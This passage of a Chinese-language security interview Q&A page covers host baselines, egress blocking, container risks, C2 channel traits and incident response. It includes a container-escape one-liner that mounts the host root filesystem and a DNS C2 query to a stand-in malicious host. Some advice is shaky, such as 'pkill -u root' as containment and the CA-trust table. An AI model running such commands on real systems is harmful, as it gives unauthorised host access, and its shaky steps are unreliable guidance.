Cloud）</strong></th></tr></thead><tbody><tr><td><strong>隔离性</strong></td><td>共享网络</td><td>独立私有网络</td></tr><tr><td><strong>安全性</strong></td><td>较低</td><td>更高（可配置子网、ACL、NACL）</td></tr><tr><td><strong>扩展性</strong></td><td>受限</td><td>可灵活定义子网、路由</td></tr><tr><td><strong>适用场景</strong></td><td>传统数据中心</td><td>云计算、混合云</td></tr></tbody></table><hr><h3 id="主机最重要的基线是什么？"><a href="#主机最重要的基线是什么？" class="headerlink" title="主机最重要的基线是什么？"></a><strong>主机最重要的基线是什么？</strong></h3><h2 id="安全基线：1-最小权限原则：-关闭不必要的服务：-2-日志审计：-启用-auditd-记录关键操作：-3-访问控制：-仅允许特定-IP-登录："><a href="#安全基线：1-最小权限原则：-关闭不必要的服务：-2-日志审计：-启用-auditd-记录关键操作：-3-访问控制：-仅允许特定-IP-登录：" class="headerlink" title="安全基线：1. 最小权限原则：   - 关闭不必要的服务：     2. 日志审计：   - 启用 auditd 记录关键操作：     3. 访问控制：   - 仅允许特定 IP 登录：     "></a><strong>安全基线</strong>：<br>1. <strong>最小权限原则</strong>：<br>   - 关闭不必要的服务：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">disable</span> telnet</span><br></pre></td></tr></table></figure><br>2. <strong>日志审计</strong>：<br>   - 启用 <code>auditd</code> 记录关键操作：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auditctl -w /etc/passwd -p wa -k passwd_change</span><br></pre></td></tr></table></figure><br>3. <strong>访问控制</strong>：<br>   - 仅允许特定 IP 登录：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -s 192.168.1.100 -j ACCEPT</span><br></pre></td></tr></table></figure></h2><h3 id="禁止出网的价值有哪些？"><a href="#禁止出网的价值有哪些？" class="headerlink" title="禁止出网的价值有哪些？"></a><strong>禁止出网的价值有哪些？</strong></h3><p><strong>主要价值</strong>：</p><ol><li><strong>防止数据泄露</strong>：<ul><li>限制服务器主动连接外部 IP，防止数据外泄。</li></ul></li><li><strong>阻止 C2（C&amp;C）通信</strong>：<ul><li>防止恶意软件与攻击者服务器建立连接。</li></ul></li></ol><h2 id="实施方法：-配置防火墙规则："><a href="#实施方法：-配置防火墙规则：" class="headerlink" title="实施方法：- 配置防火墙规则：  "></a><strong>实施方法</strong>：<br>- 配置防火墙规则：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp -j REJECT</span><br></pre></td></tr></table></figure></h2><h3 id="云原生下的网络和主机差异是什么？会有哪些新的风险？"><a href="#云原生下的网络和主机差异是什么？会有哪些新的风险？" class="headerlink" title="云原生下的网络和主机差异是什么？会有哪些新的风险？"></a><strong>云原生下的网络和主机差异是什么？会有哪些新的风险？</strong></h3><p><strong>主要差异</strong>：</p><ul><li><strong>传统主机</strong>：依赖固定 IP，基于 <strong>防火墙</strong> 保护。</li><li><strong>云原生</strong>：基于 <strong>容器网络（CNI）</strong>，采用 <strong>微服务架构</strong>。</li></ul><h2 id="新风险：1-动态-IP-变化：-传统-ACL-规则难以适配。2-横向攻击风险：-容器网络隔离不足，攻击者可在同一集群内横向移动。"><a href="#新风险：1-动态-IP-变化：-传统-ACL-规则难以适配。2-横向攻击风险：-容器网络隔离不足，攻击者可在同一集群内横向移动。" class="headerlink" title="新风险：1. 动态 IP 变化：   - 传统 ACL 规则难以适配。2. 横向攻击风险：   - 容器网络隔离不足，攻击者可在同一集群内横向移动。"></a><strong>新风险</strong>：<br>1. <strong>动态 IP 变化</strong>：<br>   - 传统 ACL 规则难以适配。<br>2. <strong>横向攻击风险</strong>：<br>   - 容器网络隔离不足，攻击者可在同一集群内横向移动。</h2><h3 id="如何实现反向-HTTPS-代理？"><a href="#如何实现反向-HTTPS-代理？" class="headerlink" title="如何实现反向 HTTPS 代理？"></a><strong>如何实现反向 HTTPS 代理？</strong></h3><h2 id="Nginx-配置反向代理："><a href="#Nginx-配置反向代理：" class="headerlink" title="Nginx 配置反向代理："></a><strong>Nginx 配置反向代理</strong>：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">ssl_certificate</span> /etc/nginx/cert.pem;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /etc/nginx/key.pem;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> https://backend.server.com;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></h2><h3 id="如何通过技术手段避免非预期端口开放？"><a href="#如何通过技术手段避免非预期端口开放？" class="headerlink" title="如何通过技术手段避免非预期端口开放？"></a><strong>如何通过技术手段避免非预期端口开放？</strong></h3><h2 id="方法：1-使用防火墙：-2-端口监听监测：-3-应用层访问控制：-配置-Nginx-仅允许特定-IP-访问："><a href="#方法：1-使用防火墙：-2-端口监听监测：-3-应用层访问控制：-配置-Nginx-仅允许特定-IP-访问：" class="headerlink" title="方法：1. 使用防火墙：   2. 端口监听监测：   3. 应用层访问控制：   - 配置 Nginx 仅允许特定 IP 访问：     "></a><strong>方法</strong>：<br>1. <strong>使用防火墙</strong>：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 3306 -j DROP</span><br></pre></td></tr></table></figure><br>2. <strong>端口监听监测</strong>：<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep LISTEN</span><br></pre></td></tr></table></figure><br>3. <strong>应用层访问控制</strong>：<br>   - 配置 <strong>Nginx 仅允许特定 IP 访问</strong>：<br>     <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">allow</span> <span class="number">192.168.1.100</span>;</span><br><span class="line"><span class="attribute">deny</span> all;</span><br></pre></td></tr></table></figure></h2><h3 id="容器存在哪些特有安全风险？"><a href="#容器存在哪些特有安全风险？" class="headerlink" title="容器存在哪些特有安全风险？"></a><strong>容器存在哪些特有安全风险？</strong></h3><ol><li><strong>容器逃逸</strong>：<ul><li>通过 <code>docker.sock</code> 访问宿主机：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/host ubuntu <span class="built_in">chroot</span> /host</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>镜像供应链攻击</strong>：<ul><li>恶意镜像可能包含后门。</li></ul></li></ol><h2 id="防护措施：-限制容器权限：-使用可信镜像来源。"><a href="#防护措施：-限制容器权限：-使用可信镜像来源。" class="headerlink" title="防护措施：- 限制容器权限：  - 使用可信镜像来源。"></a><strong>防护措施</strong>：<br>- 限制容器权限：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --cap-drop=ALL</span><br></pre></td></tr></table></figure><br>- 使用可信镜像来源。</h2><h3 id="运维自屏化的难点是什么？"><a href="#运维自屏化的难点是什么？" class="headerlink" title="运维自屏化的难点是什么？"></a><strong>运维自屏化的难点是什么？</strong></h3><ol><li><strong>自动化程度要求高</strong>：<ul><li>需要 DevOps&#x2F;CI&#x2F;CD 深度集成。</li></ul></li><li><strong>安全策略同步</strong>：<ul><li>防火墙、身份验证策略需一致。</li></ul></li></ol><hr><h3 id="不同语言对于系统-CA-证书的信任情况有何不同？如何让各语言信任系统-CA-证书？"><a href="#不同语言对于系统-CA-证书的信任情况有何不同？如何让各语言信任系统-CA-证书？" class="headerlink" title="不同语言对于系统 CA 证书的信任情况有何不同？如何让各语言信任系统 CA 证书？"></a><strong>不同语言对于系统 CA 证书的信任情况有何不同？如何让各语言信任系统 CA 证书？</strong></h3><table><thead><tr><th><strong>语言</strong></th><th><strong>默认 CA 证书策略</strong></th><th><strong>信任系统 CA 证书方式</strong></th></tr></thead><tbody><tr><td><strong>Java</strong></td><td>使用 JDK 内置 CA</td><td><code>keytool -importkeystore</code></td></tr><tr><td><strong>Python</strong></td><td>使用 <code>certifi</code></td><td><code>export CURL_CA_BUNDLE</code></td></tr><tr><td><strong>Node.js</strong></td><td>默认不信任</td><td><code>export NODE_EXTRA_CA_CERTS</code></td></tr></tbody></table><hr><h3 id="简单描述有哪几种方式实现服务器截外联，各自利弊是什么？"><a href="#简单描述有哪几种方式实现服务器截外联，各自利弊是什么？" class="headerlink" title="简单描述有哪几种方式实现服务器截外联，各自利弊是什么？"></a><strong>简单描述有哪几种方式实现服务器截外联，各自利弊是什么？</strong></h3><ol><li><p><strong>防火墙规则</strong>（最常用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp -j REJECT</span><br></pre></td></tr></table></figure><p><strong>优点</strong>：高效、直接。<br><strong>缺点</strong>：误操作可能影响正常业务。</p></li><li><p><strong>代理服务器</strong>（透明代理）</p><ul><li>通过 <strong>Squid、Shadowsocks</strong> 控制流量：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://proxy.server:3128&quot;</span></span><br></pre></td></tr></table></figure><strong>优点</strong>：可审计流量。<br><strong>缺点</strong>：额外维护成本。</li></ul></li><li><p><strong>DNS 解析控制</strong></p><ul><li>仅允许可信域名解析：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;127.0.0.1 malicious.com&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><strong>优点</strong>：防止恶意 C2 通信。<br><strong>缺点</strong>：不适用于 IP 直连流量。</li></ul></li><li><p><strong>SOCKS5 隧道</strong></p><ul><li>通过 <strong>SSH 隧道</strong> 控制网络流量：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 user@proxy-server</span><br></pre></td></tr></table></figure><strong>优点</strong>：可用于加密通信。<br><strong>缺点</strong>：需要 SOCKS5 代理支持。</li></ul></li></ol><h2 id="威胁应对岗"><a href="#威胁应对岗" class="headerlink" title="威胁应对岗"></a>威胁应对岗</h2><h3 id="如何衡量威胁感知能力强弱？"><a href="#如何衡量威胁感知能力强弱？" class="headerlink" title="如何衡量威胁感知能力强弱？"></a><strong>如何衡量威胁感知能力强弱？</strong></h3><p><strong>衡量指标</strong>：</p><ol><li><strong>检测覆盖率</strong>：<ul><li>能否覆盖 <strong>网络、应用、终端、日志</strong> 多个层面。</li></ul></li><li><strong>误报率&#x2F;漏报率</strong>：<ul><li>误报过多会影响运维，漏报则可能导致攻击未被发现。</li></ul></li><li><strong>实时性</strong>：<ul><li>是否能够 <strong>实时分析、秒级响应</strong>。</li></ul></li></ol><p><strong>提升方法</strong>：</p><ul><li>结合 <strong>AI 机器学习</strong> 提升威胁检测精准度。</li><li>采用 <strong>关联分析（SIEM）</strong>，分析不同日志来源的数据。</li></ul><hr><h3 id="感知规则的有效性如何系统验证？"><a href="#感知规则的有效性如何系统验证？" class="headerlink" title="感知规则的有效性如何系统验证？"></a><strong>感知规则的有效性如何系统验证？</strong></h3><h2 id="验证方法：1-攻击模拟测试：-使用-Kali-Linux、Metasploit-模拟攻击场景，测试规则是否生效。2-历史攻击回放：-通过-日志重放-复现真实攻击流量，验证拦截效果：-3-对抗样本测试：-生成变种攻击-payload，测试-WAF-规避能力。"><a href="#验证方法：1-攻击模拟测试：-使用-Kali-Linux、Metasploit-模拟攻击场景，测试规则是否生效。2-历史攻击回放：-通过-日志重放-复现真实攻击流量，验证拦截效果：-3-对抗样本测试：-生成变种攻击-payload，测试-WAF-规避能力。" class="headerlink" title="验证方法：1. 攻击模拟测试：   - 使用 Kali Linux、Metasploit 模拟攻击场景，测试规则是否生效。2. 历史攻击回放：   - 通过 日志重放 复现真实攻击流量，验证拦截效果：     3. 对抗样本测试：   - 生成变种攻击 payload，测试 WAF 规避能力。"></a><strong>验证方法</strong>：<br>1. <strong>攻击模拟测试</strong>：<br>   - 使用 <strong>Kali Linux</strong>、<strong>Metasploit</strong> 模拟攻击场景，测试规则是否生效。<br>2. <strong>历史攻击回放</strong>：<br>   - 通过 <strong>日志重放</strong> 复现真实攻击流量，验证拦截效果：<br>     <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpreplay -i eth0 attack_traffic.pcap</span><br></pre></td></tr></table></figure><br>3. <strong>对抗样本测试</strong>：<br>   - 生成变种攻击 payload，测试 WAF 规避能力。</h2><h3 id="未知部分如何衡量？"><a href="#未知部分如何衡量？" class="headerlink" title="未知部分如何衡量？"></a><strong>未知部分如何衡量？</strong></h3><h2 id="未知威胁的衡量方法：1-基线偏离检测：-记录-正常流量模式，发现异常行为：-2-行为分析：-采用-UEBA（用户实体行为分析），检测异常行为模式。3-蜜罐技术：-部署-Honeypot-诱捕攻击者，分析未知攻击方式。"><a href="#未知威胁的衡量方法：1-基线偏离检测：-记录-正常流量模式，发现异常行为：-2-行为分析：-采用-UEBA（用户实体行为分析），检测异常行为模式。3-蜜罐技术：-部署-Honeypot-诱捕攻击者，分析未知攻击方式。" class="headerlink" title="未知威胁的衡量方法：1. 基线偏离检测：   - 记录 正常流量模式，发现异常行为：     2. 行为分析：   - 采用 UEBA（用户实体行为分析），检测异常行为模式。3. 蜜罐技术：   - 部署 Honeypot 诱捕攻击者，分析未知攻击方式。"></a><strong>未知威胁的衡量方法</strong>：<br>1. <strong>基线偏离检测</strong>：<br>   - 记录 <strong>正常流量模式</strong>，发现异常行为：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_csv(<span class="string">&quot;traffic_logs.csv&quot;</span>)</span><br><span class="line">df.describe()</span><br></pre></td></tr></table></figure><br>2. <strong>行为分析</strong>：<br>   - 采用 <strong>UEBA（用户实体行为分析）</strong>，检测异常行为模式。<br>3. <strong>蜜罐技术</strong>：<br>   - 部署 <strong>Honeypot</strong> 诱捕攻击者，分析未知攻击方式。</h2><h2 id="流量采集与清洗"><a href="#流量采集与清洗" class="headerlink" title="流量采集与清洗"></a><strong>流量采集与清洗</strong></h2><h3 id="威胁感知可以在哪些层面进行？"><a href="#威胁感知可以在哪些层面进行？" class="headerlink" title="威胁感知可以在哪些层面进行？"></a><strong>威胁感知可以在哪些层面进行？</strong></h3><h2 id="不同层面的威胁感知：1-网络层：-监测-异常端口扫描、DDoS-攻击。2-应用层：-发现-SQL-注入、XSS、业务滥用。3-终端层：-监测-恶意软件、C2-连接。4-用户行为层：-通过-UEBA-检测账号盗用、异常访问。"><a href="#不同层面的威胁感知：1-网络层：-监测-异常端口扫描、DDoS-攻击。2-应用层：-发现-SQL-注入、XSS、业务滥用。3-终端层：-监测-恶意软件、C2-连接。4-用户行为层：-通过-UEBA-检测账号盗用、异常访问。" class="headerlink" title="不同层面的威胁感知：1. 网络层：   - 监测 异常端口扫描、DDoS 攻击。2. 应用层：   - 发现 SQL 注入、XSS、业务滥用。3. 终端层：   - 监测 恶意软件、C2 连接。4. 用户行为层：   - 通过 UEBA 检测账号盗用、异常访问。"></a><strong>不同层面的威胁感知</strong>：<br>1. <strong>网络层</strong>：<br>   - 监测 <strong>异常端口扫描、DDoS 攻击</strong>。<br>2. <strong>应用层</strong>：<br>   - 发现 <strong>SQL 注入、XSS、业务滥用</strong>。<br>3. <strong>终端层</strong>：<br>   - 监测 <strong>恶意软件、C2 连接</strong>。<br>4. <strong>用户行为层</strong>：<br>   - 通过 <strong>UEBA</strong> 检测账号盗用、异常访问。</h2><h3 id="TCP-协议的流量要存储哪些关键字段？"><a href="#TCP-协议的流量要存储哪些关键字段？" class="headerlink" title="TCP 协议的流量要存储哪些关键字段？"></a><strong>TCP 协议的流量要存储哪些关键字段？</strong></h3><h2 id="关键字段：1-源-IP-目标-IP：-识别攻击来源。2-源端口-目标端口：-确定服务类型（如-80-为-HTTP）。3-数据包序列号（SEQ）：-用于检测-TCP-重传、流量重放。4-流量方向（IN-OUT）：-便于区分出站-入站流量。"><a href="#关键字段：1-源-IP-目标-IP：-识别攻击来源。2-源端口-目标端口：-确定服务类型（如-80-为-HTTP）。3-数据包序列号（SEQ）：-用于检测-TCP-重传、流量重放。4-流量方向（IN-OUT）：-便于区分出站-入站流量。" class="headerlink" title="关键字段：1. 源 IP&#x2F;目标 IP：   - 识别攻击来源。2. 源端口&#x2F;目标端口：   - 确定服务类型（如 80 为 HTTP）。3. 数据包序列号（SEQ）：   - 用于检测 TCP 重传、流量重放。4. 流量方向（IN&#x2F;OUT）：   - 便于区分出站&#x2F;入站流量。"></a><strong>关键字段</strong>：<br>1. <strong>源 IP&#x2F;目标 IP</strong>：<br>   - 识别攻击来源。<br>2. <strong>源端口&#x2F;目标端口</strong>：<br>   - 确定服务类型（如 80 为 HTTP）。<br>3. <strong>数据包序列号（SEQ）</strong>：<br>   - 用于检测 TCP 重传、流量重放。<br>4. <strong>流量方向（IN&#x2F;OUT）</strong>：<br>   - 便于区分出站&#x2F;入站流量。</h2><h3 id="如何在服务器上抓取-HTTPS-流量进行分析？"><a href="#如何在服务器上抓取-HTTPS-流量进行分析？" class="headerlink" title="如何在服务器上抓取 HTTPS 流量进行分析？"></a><strong>如何在服务器上抓取 HTTPS 流量进行分析？</strong></h3><p><strong>方法 1：使用 <code>tcpdump</code> 抓包</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 443 -w https_traffic.pcap</span><br></pre></td></tr></table></figure><p><strong>方法 2：使用 Wireshark 解密 HTTPS</strong></p><ol><li>在浏览器设置 <code>SSLKEYLOGFILE</code> 环境变量：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SSLKEYLOGFILE=/tmp/sslkeys.log</span><br></pre></td></tr></table></figure></li><li>在 Wireshark 加载 <code>sslkeys.log</code> 进行流量解密。</li></ol><h2 id="方法-3：使用-mitmproxy-进行-HTTPS-代理"><a href="#方法-3：使用-mitmproxy-进行-HTTPS-代理" class="headerlink" title="方法 3：使用 mitmproxy 进行 HTTPS 代理"></a><strong>方法 3：使用 mitmproxy 进行 HTTPS 代理</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy -p 8080 --mode transparent</span><br></pre></td></tr></table></figure></h2><h3 id="常见的-C-C-通道种类和特征？"><a href="#常见的-C-C-通道种类和特征？" class="headerlink" title="常见的 C&amp;C 通道种类和特征？"></a><strong>常见的 C&amp;C 通道种类和特征？</strong></h3><p><strong>常见 C&amp;C（Command &amp; Control）通道类型</strong>：</p><ol><li><strong>基于 HTTP&#x2F;HTTPS</strong>：<ul><li>伪装成正常 Web 流量，C2 服务器隐藏在 CDN 之后。</li></ul></li><li><strong>基于 DNS</strong>：<ul><li>通过 DNS 解析数据，如 <code>base64</code> 编码数据存储在 TXT 记录中：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @malicious.com TXT</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>基于 P2P</strong>：<ul><li>无需中心化服务器，如 Botnet 网络。</li></ul></li><li><strong>基于社交媒体</strong>：<ul><li>通过 Telegram、Twitter 传输命令。</li></ul></li></ol><p><strong>特征分析</strong>：</p><ul><li><strong>上行流量比下行流量大</strong>（Bot 设备发送大量数据）。</li><li><strong>长连接保持</strong>，会话时间较长。</li><li><strong>请求心跳机制</strong>，周期性访问 C2 服务器。</li><li><strong>异常资源引用</strong>，无 JS&#x2F;CSS 但频繁访问 URL。</li></ul><hr><h3 id="如何在加密流量中检测出恶意流量？"><a href="#如何在加密流量中检测出恶意流量？" class="headerlink" title="如何在加密流量中检测出恶意流量？"></a><strong>如何在加密流量中检测出恶意流量？</strong></h3><p><strong>检测方法</strong>：</p><ol><li><strong>流量模式分析</strong>：<ul><li>识别异常长连接、周期性数据包特征。</li></ul></li><li><strong>JA3 指纹识别</strong>（TLS 指纹）：<ul><li>通过 <code>JA3</code> 指纹匹配 C2 服务器行为：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ja3 -r capture.pcap</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>SNI 分析</strong>：<ul><li>检查 SNI 是否访问异常域名，如：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep SNI /var/log/ssl_access.log</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="如何识别异常服务器外联？"><a href="#如何识别异常服务器外联？" class="headerlink" title="如何识别异常服务器外联？"></a><strong>如何识别异常服务器外联？</strong></h3><p><strong>异常外联行为</strong>：</p><ol><li><strong>短时间内连接多个可疑 IP</strong>：<ul><li><code>netstat -an</code> 发现大量出站连接。</li></ul></li><li><strong>访问冷门域名</strong>：<ul><li>通过 <code>dnsmasq.log</code> 发现非常见域名解析：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;QUERY&quot;</span> /var/log/dnsmasq.log</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>加密流量异常增多</strong>：<ul><li><code>tcpdump</code> 抓包分析 TLS 连接数量激增：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 443</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="基于网络五元组可以做哪些风险行为的分析？"><a href="#基于网络五元组可以做哪些风险行为的分析？" class="headerlink" title="基于网络五元组可以做哪些风险行为的分析？"></a><strong>基于网络五元组可以做哪些风险行为的分析？</strong></h3><p><strong>五元组（源 IP、目的 IP、源端口、目的端口、协议）分析风险</strong>：</p><ol><li><strong>端口扫描检测</strong>：<ul><li>同一 IP 短时间访问多个端口：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;SYN&quot;</span> /var/log/firewall.log</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>流量突变</strong>：<ul><li>发现异常上传流量（如数据泄露）。</li></ul></li><li><strong>协议异常</strong>：<ul><li>HTTP 端口传输非 HTTP 数据，可能是隧道通信。</li></ul></li></ol><hr><h2 id="风险识别与应对-主机侧"><a href="#风险识别与应对-主机侧" class="headerlink" title="风险识别与应对 - 主机侧"></a><strong>风险识别与应对 - 主机侧</strong></h2><h3 id="主机有那些日志对风险识别有帮助？"><a href="#主机有那些日志对风险识别有帮助？" class="headerlink" title="主机有那些日志对风险识别有帮助？"></a><strong>主机有那些日志对风险识别有帮助？</strong></h3><p><strong>关键日志</strong>：</p><ol><li>**<code>/var/log/auth.log</code>**：<ul><li>记录 SSH 登录，发现暴力破解攻击。</li></ul></li><li>**<code>/var/log/syslog</code>**：<ul><li>记录系统异常事件，如 root 权限提权。</li></ul></li><li>**<code>/var/log/secure</code>**：<ul><li>记录 sudo 操作，判断是否有非授权提权行为。</li></ul></li></ol><hr><h3 id="抽象来看主机中有哪些日志可实现方式？"><a href="#抽象来看主机中有哪些日志可实现方式？" class="headerlink" title="抽象来看主机中有哪些日志可实现方式？"></a><strong>抽象来看主机中有哪些日志可实现方式？</strong></h3><p><strong>日志类型</strong>：</p><ol><li><strong>安全审计日志</strong>：<ul><li>记录用户登录、权限变更（如 <code>auth.log</code>）。</li></ul></li><li><strong>系统事件日志</strong>：<ul><li>进程启动&#x2F;终止（<code>dmesg</code>）。</li></ul></li><li><strong>网络连接日志</strong>：<ul><li>记录出站&#x2F;入站流量（<code>iptables log</code>）。</li></ul></li></ol><hr><h3 id="一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？"><a href="#一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？" class="headerlink" title="一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？"></a><strong>一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？</strong></h3><p><strong>溯源方法</strong>：</p><ol><li>**检查 <code>.bash_history</code>**：<ul><li>可能留下命令痕迹：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.bash_history</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>查看 <code>/proc</code> 进程信息</strong>：<ul><li>运行 <code>ps aux</code>，查找隐藏进程：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep suspicious</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>恢复日志</strong>：<ul><li>使用 <code>extundelete</code> 尝试恢复被删除的日志：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extundelete /dev/sda1 --restore-all</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>检查文件变更时间</strong>：<ul><li>通过 <code>ls -lt</code> 确认最近修改的可疑文件。</li></ul></li></ol><hr><h3 id="某个黑客入侵主机后，拿到了-root-权限，如何止血？"><a href="#某个黑客入侵主机后，拿到了-root-权限，如何止血？" class="headerlink" title="某个黑客入侵主机后，拿到了 root 权限，如何止血？"></a><strong>某个黑客入侵主机后，拿到了 root 权限，如何止血？</strong></h3><p><strong>紧急止血方案</strong>：</p><ol><li><strong>限制 root 访问</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd -l root</span><br></pre></td></tr></table></figure></li><li><strong>强制踢除攻击者会话</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkill -u root</span><br></pre></td></tr></table></figure></li><li><strong>关闭网络访问</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 down</span><br></pre></td></tr></table></figure></li><li><strong>恢复安全策略</strong>：<ul><li>重新部署 <code>iptables</code> 规则。</li></ul></li></ol><hr><h3 id="感知到黑客入侵了所有服务器，怎么办？"><a href="#感知到黑客入侵了所有服务器，怎么办？" class="headerlink" title="感知到黑客入侵了所有服务器，怎么办？"></a><strong>感知到黑客入侵了所有服务器，怎么办？</strong></h3><p><strong>紧急响应步骤</strong>：</p><ol><li><strong>隔离受感染服务器</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -s attacker_ip -j DROP</span><br></pre></td></tr></table></figure></li><li><strong>分析恶意软件</strong>：<ul><li>提取恶意进程的 <code>hash</code> 进行溯源：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sha256sum</span> /tmp/malware</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>重置所有凭据</strong>：<ul><li>重新生成 <code>SSH</code> 密钥，并修改 root 密码：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -f /root/.ssh/id_rsa -N <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>检查持久化后门</strong>：<ul><li>检查 <code>crontab</code> 是否被篡改：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>全网威胁狩猎</strong>：<ul><li>扫描所有服务器，查找相同恶意进程：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep malware</span><br></pre></td></tr></table></figure></li></ul></li></ol><hr><h3 id="如何准确识别域名探测？"><a href="#如何准确识别域名探测？" class="headerlink" title="如何准确识别域名探测？"></a><strong>如何准确识别域名探测？</strong></h3><p><strong>探测特征</strong>：</p><ul><li>解析大量不存在的子域：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep NXDOMAIN 